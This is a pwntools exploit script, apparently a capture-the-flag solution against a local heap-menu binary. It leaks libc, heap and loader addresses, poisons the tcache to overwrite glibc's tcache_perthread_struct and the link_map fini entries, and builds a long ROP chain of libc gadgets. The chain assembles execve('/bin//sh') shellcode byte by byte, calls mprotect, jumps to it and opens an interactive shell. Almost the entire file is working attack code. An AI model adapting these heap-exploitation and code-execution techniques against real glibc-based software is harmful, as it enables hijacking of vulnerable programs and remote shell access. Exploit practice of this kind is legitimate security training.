# Copyright (c) 2024, LMS57
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#     * Redistributions of source code must retain the above copyright notice,
#       this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice,this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the copyright holder nor the names of its
#       contributors may be used to endorse or promote products derived from
#       this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.


from pwn import *
#context.log_level = 'DEBUG'
context.terminal = ['mate-terminal', '-e']

p = process('../binaries/a.out', cwd='../binaries')

chain = [

0x12c080, #rdi = 8
0x2de10, #mov rdx, rdi
0x12c080, #rdi = 8
0x144280, #mov rsi, rdi

0x87340, #mov rdi, libc
0x9ae40, #mov [rdi], sil

0x12dde0, #rdi = 2
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xf3)

0x12dde0, #rdi = 2
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xf)

0x12dde0, #rdi = 2
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0xec900, #mov [rdi], 0
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x1e)

0x12f810, #rdi = 9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xfa)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x31)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xc0)

0x12f810, #rdi = 9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x50)

0x12e580, #rdi = 1
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x48)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x31)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xd2)

0x12e580, #rdi = 1
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x48)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x31)

0x12bab0, #rdi = 5
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xf6)

0x12e580, #rdi = 1
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x48)

0x12da90, #rdi = 4
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xbb)

0x12e0f0, #rdi = 6
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x2f)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x62)

0x12e0f0, #rdi = 6
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x69)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x6e)

0x12e0f0, #rdi = 6
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x2f)

0x12e0f0, #rdi = 6
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x2f)

0x12cf60, #rdi = 3
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x73)

0x12bab0, #rdi = 5
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x68)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x53)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x54)

0xf63d0, #rdi = 0
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x101860, #sub rdi, 1
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x5f)

0x12e0f0, #rdi = 6
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xb0)

0x12cf60, #rdi = 3
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x3b)

0x12dde0, #rdi = 2
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0xa8360, #sub rdi, 0xb9
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0xf)

0x12bab0, #rdi = 5
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil (0x5)

0x12bab0, #rdi = 5
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x363a0, #mov rdi, to end of string
0x8c070, #mov rdx, 1
0x9ae40, #mov [rdi], sil

0x12bab0, #rdi = 5
0x144280, #mov rsi, rdi
0x87340, #mov rdi, libc
0x92640, #mov [rdi], rsi
0x144280, #mov rsi, rdi
#0x87340, #mov rdi, libc

        ] + [0xa8b80]*704 + [
        0x24800, #nop
        0xa84f0, #rsi 0
        0x862b0, #mov rsi, libc val?
        0x759a0, #mov [rdi], rsi
        0x103810, #set rcx
        0x7d0d0, #set rdx
        0x10d1b0, #rsi <- rdx, rdx <- rcx
        0xf76b0, #mprotect
        0x1cfb08, #jump to shellcode
]


def send(b,a=":"):
    p.sendlineafter(a,b)

def send2(b,a=":"):
    p.sendafter(a,b)

def create(index, size):
    send('1')
    send(str(index))
    send(str(size))

def edit(index, data):
    send('2')
    send(str(index))
    send2(data)

def delete(index):
    send('3')
    send(str(index))

def show(index):
    send('4')
    send(str(index))

def end():
    send('5')

p.readuntil(': ')
leak = int(p.readline(),16)
print(hex(leak))

libc_base = leak-0x477f0

print(hex(libc_base))

create(0,0x100)
create(1, 0x100)

delete(0)

#gdb.attach(p, f'b *{libc_base + 0x000000000004ddc0}\nc')
show(0)
p.readuntil('Data: ')
leak = p.read(8)
leak = u64(leak)<<12
print(hex(leak))
delete(1)

edit(1, p64((leak+0x10) ^ (leak>>12))) #setup tcache dup for attack on tcache_perthread_struct

create(1, 0x100)
edit(1, p64(0x1c) + p64(24000 + 0x2e18)) #fini_end
create(0, 0x100) 

#leak ld
ld_leak = libc_base + 0x1c9170

edit(0, b'\x07'*0x80 + p64(ld_leak-0x10)) # overwirte tcache_perthread_struct

create(2,24)
show(2)
p.readuntil('\x00'*10)
ld_base = u64(p.read(8)) - 0x13ff0
print(hex(ld_base))

elf_map = ld_base + 0x332c0
#0x3a8280
print(hex(elf_map))

edit(0, b'\x07'*0x80 + p64(elf_map)) # overwirte tcache_perthread_struct

#gdb.attach(p)
#pause()
create(2,8)
#edit(2, p64(leak-0x20000+0x1000)) #offset inside the chunk to correctly access it
edit(2, p64(leak-0x30a8 - 8000))

edit(0, b'\x01'+ b'\x00'*0x7f + p64(elf_map+288)) #setup second write for elf_map

create(3,8)
edit(3, p64(leak+0x3b0)) #overwrite elf_map for fini_end count

chain = list(map(lambda x: x+libc_base, chain))[::-1]
chain = b''.join(map(p64,chain))
#chain = b'b'*0x1000

print(len(chain))
create(4, 8000+8000 + 8000 + 8000 + 8000)

#chain2 = b''.join(map(p64,chain2))
chain2 = b''

#gdb.attach(p)
#pause()
edit(4, chain2 + b'a'*(0x1a90+2296-8+0x2b8+0x98+0x640+0x640-0x368-8-16-0x60- len(chain2)-len(chain)+8 + 0x2c38 + 0x1950) + chain)

binsh = libc_base  
print(hex(binsh))

edit(0, b'\x07'+ b'\x00'*0x7f + p64(leak+0x4c0)) #setup second write for elf_map


end()

p.interactive()
